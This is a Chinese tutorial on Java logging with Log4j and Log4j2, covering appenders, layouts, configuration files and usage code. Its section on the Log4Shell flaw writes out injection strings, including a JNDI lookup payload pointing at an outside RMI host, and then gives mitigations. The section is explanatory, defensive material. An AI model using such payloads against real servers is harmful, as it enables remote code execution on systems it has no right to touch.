# Java 日志框架

## 1. Log4j 与 Log4j2

**日志框架出现的历史顺序**

log4j --> JUL --> JCL --> slf4j --> logback --> log4j2

log4j2是 log4j 1.x 的升级版，2015 年 5 月，Apache 宣布 log4j 1.x 停止更新，最新版截止到 1.2.17。

log4j2 参考了 logback 的一些优秀的设计，并且修复了一些问题，因此带来了一些重大的提升，主要有：

1. 异常处理：在 logback 中，Appender 中的异常不会被应用感知到，但是在 log4j2 中，提供了一些异常处理机制。
2. 性能提升：log4j2 相较于 log4j 1 和 logback，具有很明显的性能提升。
3. 自动重载配置：参考了 logback 的设计，提供自动刷新参数配置，可以动态地修改日志的级别而不需要重启应用。
4. 无垃圾机制，log4j2 在大部分情况下，都可以使用其设计的一套无垃圾机制，避免频繁的日志收集导致的 jvm gc。

### 1.1 Log4j

Log4j 有三个主要的组件/对象：**Loggers(记录器), Appenders(输出源)和 Layouts(布局)**。这里可以简单理解为日志类别，日志要输出的地方和日志以何种形式输出。

每条日志语句都要设置一个等级 (DEBUG、INFO、WARN、ERROR、FATAL)

其中等级从低到高 DEBUG < INFO < WARN < ERROR < FATAL，分别对应调试信息、一般信息、警告信息、错误信息、严重错误信息

其实在 DEBUG 之下还有 ALL 和 TRACE (ALL < TRACE < DEBUG)，在 FATAL 上还有 OFF 级别 (FATAL < OFF)，只是这些级别通常不会配置使用，用于输出所有信息或禁用输出所有信息。

#### 1.1.1 Loggers

在设置日志输出位置的时候，会给那个位置设置一个级别，只有大于等于那个级别的日志才会打印输出到指定位置。

例如：某个 Loggers (日志输出位置的等级记录器) 级别设置为 INFO，则 INFO、WARN、ERROR 和 FATAL 级别的日志信息都会输出到那个文件，而级别低于 INFO 的 DEBUG 则不会输出。

#### 1.1.2 Appenders

禁用和使用日志请求只是 Log4j 的基本功能，Log4j 日志系统还提供许多强大的功能，比如允许把日志输出到不同的地方，如控制台 (Console)、文件 (Files) 等，可以根据天数或者文件大小产生新的文件，可以以流的形式发送到其他地方等等。

常使用的类如下：

org.apache.log4j.ConsoleAppender (控制台)

org.apache.log4j.FileAppender (文件)

org.apache.log4j.DailyRollingFileAppender (每天产生一个日志文件)

org.apache.log4j.RollingFileAppender (文件大小达到指定大小时产生一个新的文件)

org.apache.log4j.WriterAppender (将日志信息以流格式发送到任意指定的地方)

**基本上可以满足日常需求，也可以自己实现 Appender 输出路径**。只需要定义一个类，实现 Appender 接口。Appender 接口中定义了一系列记录日志的方法，按照自己的规则实现这些方法即可。

#### 1.1.3 Layouts

用户可以根据自己的习惯格式化自己的日志输出，Layouts 提供四种日志输出样式，如根据 HTML 样式、自由指定样式、包含日志级别与信息的样式和包含日志时间、线程、类别等信息的样式。

常使用的类如下：

org.apache.log4j.HTMLLayout (以 HTML 表格形式布局)

org.apache.log4j.PatternLayout (可以灵活地指定布局样式)

org.apache.log4j.SimpleLayout (包含日志信息的级别和信息字符串)

org.apache.log4j.TTCCLayout (包含日志产生的时间、线程、类别等信息)

#### 1.1.4 Log4j 的使用

在实际应用中，要使 Log4j 在系统中运行**必须事先设定配置文件** (Log4j 2 提供默认配置，不需要强制配置)。配置文件事实上也就是对 Logger、Appender 及 Layout 进行相应设置。

Log4j 支持两种配置文件格式，一种是 XML 格式的文件，一种是 properties 属性文件。

##### 1.1.4.1 导包

pom.xml

```xml
<dependency>
    <groupId>log4j</groupId>
    <artifactId>log4j</artifactId>
    <version>1.2.17</version>
</dependency>
```

##### 1.1.4.2 创建配置文件

日志配置文件：log4j.properties 或者 logback-spring.xml

此处为：log4j.properties

在普通的 se 项目中放在 src 同级目录下，maven 项目放在 src/main/resources 目录下

```properties
# 日志的输出级别是debug，输出位置名字为stdout,D
log4j.rootLogger = debug,stdout,D

# 输出信息到控制台
log4j.appender.stdout = org.apache.log4j.ConsoleAppender
log4j.appender.stdout.Target = System.out
# 用特定格式输出日志
log4j.appender.stdout.layout = org.apache.log4j.PatternLayout
# 设置格式，%d,%m是输出代码中指定的信息的占位符
log4j.appender.stdout.layout.ConversionPattern = [%-5p] %d{yyyy-MM-dd HH:mm:ss,SSS} method:%l%n%m%n

# 输出warning 级别以上的日志到文件
# 文件位置为：/home/user/error.log4j
log4j.appender.D = org.apache.log4j.FileAppender
log4j.appender.D.File = /home/user/error.log4j
log4j.appender.D.Append = true
log4j.appender.D.Threshold = warn
log4j.appender.D.layout = org.apache.log4j.PatternLayout
log4j.appender.D.layout.ConversionPattern = %-d{yyyy-MM-dd HH:mm:ss} [ %t:%r ] - [ %p ] %m%n
```

##### 1.1.4.3 应用

在代码中使用 Log4j，注意 `Logger` 是来自 `org.apache.log4j.Logger` 的类

```java
public class Demo {
    @Test
    public void testLog() {
        // 获取日志记录器，这个记录器负责控制日志信息
        // Name一般取当前类类名
        Logger logger = Logger.getLogger(Demo.class);
        // 直接使用日志记录器，打印日志
        logger.debug("debug级别");
        logger.error("error级别");
    }
}
```



#### 1.1.5 配置文件详解

示例：

```properties
log4j.rootLoader=INFO,A1
log4j.appender.A1=org.apache.log4j.ConsoleAppender
log4j.appender.A1.layout=org.apache.log4j.PatternLayout
log4j.appender.A1.layout.ConversionPattern=%-4r %-5p [%t] %37c %3x - %m%n
```

##### 1) 配置根目录的语法：

```properties
log4j.rootLoader=[level],appenderName,appenderName,...
```

其中，`level` 是日志记录的优先级，分为 OFF、FATAL、ERROR、WARN、INFO、DEBUG、ALL 或者自定义的级别。Log4j 官方建议只使用四个常用的级别，优先级从高到低是 ERROR、WARN、INFO、DEBUG。通过在这里定义的级别，可以控制应用程序中相应级别的日志信息。比如在这里定义了 INFO 级别，则应用程序中所有 DEBUG 级别的日志信息将不被打印出来。

appenderName 就是指定日志信息输出到哪个地方，可以同时指定多个输出目的地。

##### 2) 配置日志信息输出目的地 Appender，其语法为：

```properties
log4j.appender.appenderName=fully.qualified.name.of.appender.class
log4j.appender.appenderName.option1=value1
...
log4j.appender.appenderName.optionN=valueN
```

其中，Log4j 提供的 appender 有以下几种：

```properties
org.apache.log4j.ConsoleAppender (控制台)
org.apache.log4j.FileAppender (文件)
org.apache.log4j.DailyRollingFileAppender (每天产生一个日志文件)
org.apache.log4j.RollingFileAppender (文件大小达到指定大小时产生一个新的文件)
org.apache.log4j.WriterAppender (将日志信息以流格式发送到任意指定的地方)
```

(1) ConsoleAppender 选项

```properties
# Threshold指定日志信息的输出最低层次
Threshold=WARN
# ImmediateFlush默认值是true,意味着所有的信息都会立即输出
ImmediateFlush=true
# Target默认情况下是System.out,指定输出控制台
Target=System.err
```

> 当 rootLogger 和 Threshold 都设置了日志级别时,会将级别高的设置生效
>
> 当存在**指定包级别**或**指定类级别**时,在**指定受影响范围**的日志中 rootLogger 的设置将失效,最终以指定级别设置的日志级别和 Threshold 的设置级组合生效选取**等级最高**的设置生效
>
> 当同时存在在**指定包级别**或**指定类级别**时,**指定类级别**的设置会最终生效
>
> https://blog.csdn.net/u011479200/article/details/102481495

(2) FileAppender 选项

```properties
# Threshold指定日志信息的输出最低层次
Threshold=WARN
# ImmediateFlush默认值是true,意味着所有的信息都会立即输出
ImmediateFlush=true
# File指定信息输出到mylog.txt文件
File=mylog.txt
# Append默认值是true,将信息追加到指定的文件中,false将信息覆盖到指定的文件内容
Append=false
```

(3) DailyRollingFileAppender 选项

```properties
# Threshold指定日志信息的输出最低层次
Threshold=WARN
# ImmediateFlush默认值是true,意味着所有的信息都会立即输出
ImmediateFlush=true
# File指定信息输出到mylog.txt文件
File=mylog.txt
# Append默认值是true,将信息追加到指定的文件中,false将信息覆盖到指定的文件内容
Append=false
# DatePattern指定文件滚动周期
# '.'yyyy-ww每周滚动一次文件,每周产生一个新的文件，也可以指定按月、周、天、时、分
# '.'yyyy-MM:每月
# '.'yyyy-ww:每周
# '.'yyyy-MM-dd:每天
# '.'yyyy-MM-dd-HH:每小时
# '.'yyyy-MM-dd-HH-mm:每分钟
DatePattern='.'yyyy-ww
```

(4) RollingFileAppender 选项

```properties
# Threshold指定日志信息的输出最低层次
Threshold=WARN
# ImmediateFlush默认值是true,意味着所有的信息都会立即输出
ImmediateFlush=true
# File指定信息输出到mylog.txt文件
File=mylog.txt
# Append默认值是true,将信息追加到指定的文件中,false将信息覆盖到指定的文件内容
Append=false
# MaxFileSize后缀可以是KB,MB或GB,在日志文件达到该大小时,会自动滚动,将新内容移到mylog.txt.1文件,后续再达到该大小,再产生mylog.txt.2文件,以此类推
MaxFileSize=100KB
# MaxBackupIndex指定可以产生的滚动文件的最大数
MaxBackupIndex=2
```

##### 3) 配置日志信息的布局，其语法为：

```properties
log4j.appender.appenderName.layout=fully.qualified.name.of.layout.class
log4j.appender.appenderName.layout.option1=value1
...
log4j.appender.appenderName.layout.optionN=valueN
```

其中，Log4j 提供的 layout 有以下几种：

```properties
org.apache.log4j.HTMLLayout (以 HTML 表格形式布局)
org.apache.log4j.PatternLayout (可以灵活地指定布局样式)
org.apache.log4j.SimpleLayout (包含日志信息的级别和信息字符串)
org.apache.log4j.TTCCLayout (包含日志产生的时间、线程、类别等信息)
```

##### 4) 输出格式设置

在配置文件中可以通过 `log4j.appender.appenderName.layout.ConversionPattern` 设置日志输出格式。

参数：

- %p：输出日志信息优先级，即 DEBUG，INFO，WARN，ERROR，FATAL

- %d：输出日志时间点的日期或时间，默认格式为 ISO8601，也可以在其后指定格式，例如 `%d{yyy MMM dd HH:mm:ss,SSS}`

- %r：输出自应用启动到输出该 log 信息耗费的毫秒数

- %c：输出日志信息所属的类，通常就是所在类的类名

- %t：输出产生该日志事件的线程名

- %l：输出日志事件的发生位置，相当于 `%C.%M(%F.%L)` 的组合，包括类名、方法名、文件名，以及在代码中的行号，例如 Testlog4.main(TestLog4.java:10)

- %x：输出和当前线程相关联的 NDC (嵌套诊断环境)，尤其用到像 Java servlets 这样的多客户多线程应用中

- %%：输出一个"%"字符

- %F：输出日志信息产生时所在的文件名称

- %L：输出代码中的行号

- %m：输出代码中指定的信息，产生的日志具体信息

- %n：输出一个回车换行符，windows 平台为 "\r\n"，Unix 平台为 "\n"，输出日志信息换行



### 1.2 Log4j2

log4j 2.x 版本不再支持像 1.x 中的 .properties 后缀的文件配置方式，2.x 版本常用 .xml 后缀的文件进行配置，除此之外还有 .json 或 .jsn 配置文件

log4j2 虽然采用 xml 风格进行配置，但依然包含三个组件，分别是 Logger(记录器)、Appender(输出目的地)、Layout(日志布局)

配置文件的位置：log4j2 默认会在 classpath 目录下搜索 log4j2.xml、log4j2.json、log4j2.jsn 等名称的文件。

搜索顺序

1. classpath 下的 log4j2-test.json 或者 log4j-test.jsn 文件
2. classpath 下的 log4j2-test.xml 文件
3. classpath 下的 log4j2.json 或者 log4j2.jsn 文件
4. classpath 下的 log4j2.xml 文件

一般默认使用 log4j2.xml 的文件名，如果需要测试，可以把 log4j2-test.xml 放到 classpath

正式环境使用 log4j2.xml，在打包部署时将 log4j2-test.xml 排除即可

#### 1.2.1 XML 配置文件解析

1、根节点 Configuration 有两个属性：status 和 monitorinterval，有两个子节点：Appenders 和 Loggers (表明可以定义多个 Appender 和 Logger)

- status：用于指定 log4j 本身的打印日志的级别

- monitorinterval：为 log4j 2.x 的新特性自动重载配置，指定自动重新配置的监测间隔时间，单位是 s，最小是 5s

2、Appenders 节点，常见的有三种子节点：Console、File、RollingFile

- Console 节点：用来定义输出到控制台的 Appender
- File 节点：用来定义输出到指定位置的文件的 Appender
- RollingFile 节点：用来定义超过指定大小自动删除或归档旧的 Appender，创建新的 Appender

通过在子节点中加入 `<PatternLayout pattern="自定义信息格式" />` 进行日志布局

常用的占位符：

- %c 或 %logger：输出 logger 名称

- %C：输出类名

- %d{HH:mm:ss.SSS}：输出到毫秒的时间

- %t：输出当前线程的名称

- %-5p 或 %-5level：输出日志级别，-5 表示左对齐并且固定输出 5 个字符，如果字符串不够则往右边填充空格

- %m 或 %msg：输出代码中指定的信息，产生的日志具体信息

- %n：换行

其他常用的占位符：

- %F：输出所在类文件名，如 Log4j2Test.java
- %L：输出行号
- %M 或 %method：输出所在方法名
- %l：输出日志事件的发生位置，相当于 `%C.%M(%F.%L)` 的组合，包括类名、方法名、文件名、行号
- %replace{pattern}{regex}{substitution}：将 pattern 的输出结果按照正则表达式 regex 替换成 substitution

3、Loggers 节点，常见的有两种：Root 和 Logger

- Root 节点用来指定项目的根日志，如果没有单独指定 Logger，那么就会默认使用该 Root 日志输出

- Logger 节点用来单独指定日志的形式，比如要为指定包下的 class 指定不同的日志级别等

#### 1.2.2 Log4j2 的使用

##### 1.2.2.1 导包

pom.xml

```xml
<dependencies>
    <!-- 日志接口 -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-api</artifactId>
        <version>2.23.1</version>
    </dependency>
    <!-- 日志实现 -->
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.23.1</version>
    </dependency>
</dependencies>
```

##### 1.2.2.2 创建配置文件

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<Configuration status="error">
    <!-- 先定义所有的appender -->
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <!-- 控制台只输出level以上级别的信息onMatch接受,其他的直接拒绝onMismatch -->
            <ThresholdFilter level="trace" onMatch="ACCEPT" onMismatch="DENY"/>
            <!-- 输出日志格式 -->
            <PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %class{36} %L %M - %msg%xEx%n"/>
        </Console>

        <!-- 文件会打印出所有信息，log在每次运行程序时会自动清空，由append属性决定 -->
        <!-- append为true将信息追加到指定的文件中,false将信息覆盖指定的文件内容,默认值是true -->
        <File name="log" fileName="./logs/log4j2.log" append="false">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %class{36} %L %M - %msg%xEx%n"/>
        </File>

        <!-- 添加过滤器ThresholdFilter，可以选择性输出某个级别以上的类别 -->
        <!-- onMatch="ACCEPT" onMismatch="DENY" 匹配则接受，不匹配则拒绝 -->
        <File name="ERROR" fileName="./logs/error.log">
            <ThresholdFilter level="error" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="%d{yyyy.MM.dd 'at' HH:mm:ss z} %-5level %class{36} %L %M - %msg%xEx%n"/>
        </File>

        <!-- 这里的RollingFile会打印出所有信息，每当大小超过指定的size，则size大小的日志会自动存入按年份-月份建立的文件夹下并进行压缩归档 -->
        <RollingFile name="RollingFile" fileName="./logs/web.log"
                     filePattern="logs/$${date:yyyy-MM}/web-%d{MM-dd-yyyy}-%i.log.gz">
            <PatternLayout pattern="%d{yyyy-MM-dd 'at' HH:mm:ss z} %-5level %class{36} %L %M - %msg%xEx%n"/>
            <SizeBasedTriggeringPolicy size="2MB"/>
        </RollingFile>
    </Appenders>

    <!-- 定义logger，只有在logger中引入appender，appender才能生效 -->
    <Loggers>
        <Root level="trace">
            <AppenderRef ref="RollingFile"/>
            <AppenderRef ref="Console"/>
            <AppenderRef ref="ERROR"/>
            <AppenderRef ref="log"/>
        </Root>
    </Loggers>
</Configuration>
```

##### 1.2.2.3 应用

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {

    private static Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);


    public static void main(String[] args) {
        for (int i = 0; i < 3; i++) {
            // 记录trace级别的信息
            logger.trace("log4j2日志输出：This is trace message.");
            // 记录debug级别的信息
            logger.debug("log4j2日志输出：This is debug message.");
            // 记录info级别的信息
            logger.info("log4j2日志输出：This is info message.");
            // 记录error级别的信息
            logger.error("log4j2日志输出：This is error message.");
        }
    }
}
```

#### 1.2.3 Log4j 的 Bug 及解决方案

前提：需要在 log4j 2.14.1 及之前的版本下测试

在用户登录场景，代码如下

```java
public void login(String name) {
    String name = "test"; // 表单接收name字段
    logger.info("{},登录了", name); // logger由log4j提供
}
```

用户如果登录了，通过表单接收到 name 字段，并在日志中记录这条记录。

这个常规操作为什么会导致 bug？

**lookup 支持打印系统变量**

> log4j2的历史重大漏洞（通常称为“Log4Shell”）主要受到了lookup功能的影响。这个漏洞，标识为CVE-2021-44228，影响了2.0-beta9到2.14.1版本的Apache log4j2库。该漏洞存在于log4j2的JNDI特性中，允许通过特制的日志消息执行远程代码，这是由于log4j2的lookup功能过于灵活，特别是它支持从外部源（如LDAP服务器）动态加载数据。
>
> Lookup功能允许开发人员在日志配置中使用变量，这些变量可以在运行时解析。在Log4Shell漏洞中，攻击者可以通过发送包含恶意LDAP URL的日志消息来利用这一点。log4j2在处理这些特殊构造的消息时会尝试从提供的URL中获取数据，这可能导致执行攻击者控制的代码。因此，该漏洞极大地影响了使用受影响版本的log4j2的系统的安全。

name 变量是用户输入的，用户输入什么都可以，上面的例子是字符串 test，那么用户是否可以输入特殊内容？

```java
public void login(String name) {
    String name = "${java:os}"; // 用户输入的name内容为 ${java:os}
    logger.info("{},登录了", name); // logger由log4j提供
}
```

如果用户输入的是 ${java:os}，那么日志中记录的会是系统相关的信息。

这种奇怪的现象是因为 log4j 提供了 lookup 的功能，lookup 功能简单来说就是可以把一些系统变量放到日志中。非常类似 SQL 注入。

**JNDI 介绍**

一个服务：jndi:rmi:192.168.9.23:1099/remote

如果被攻击的服务器，比如某台线上服务器，访问或执行了 JNDI 服务，那么线上服务器就会执行 JNDI 服务中的 remote 方法的代码。

如果用户输入的是 JNDI 的服务器地址 ${jndi:rmi:192.168.9.23:1099/remote}

```java
public void login(String name) {
    String name = "${jndi:rmi:192.168.9.23:1099/remote}"; // 用户输入的name内容为 jndi 相关信息
    logger.info("{},登录了", name); // logger由log4j提供
}
```

只要用 log4j 来打印该日志，那么 log4j 就会执行 jndi:rmi:192.168.9.23:1099/remote 服务，线上服务器可以被 jndi 服务中的恶意代码操作。

**解决方式**

解决方式有以下几个：

- 禁用 lookup 服务或 JNDI 服务

  lookup 和 JNDI 是导致漏洞的根本原因，可以修改配置 log4j2.formatMsgNoLookups=True 或禁用 JNDI 服务。

- 升级 Apache Log4j

  影响范围主要是 Apache Log4j 2.x <= 2.14.1，升级 Log4j 版本即可。



## 2. 参考资料

[Log4j2日志记录框架的使用教程与简单实例](https://blog.csdn.net/pan_junbiao/article/details/104313938)

[log4j2配置文件模板（带详细注释）](https://blog.csdn.net/yucaifu1989/article/details/124988933)

[一文带你彻底掌握Log4j2](https://www.cnblogs.com/antLaddie/p/15904895.html)

[log4j2 的使用【超详细图文】](https://blog.csdn.net/weixin_32265569/article/details/110723441)

[Log4j 2官方文档中文翻译](https://huanio.gitbooks.io/doc-log4j-2/content/)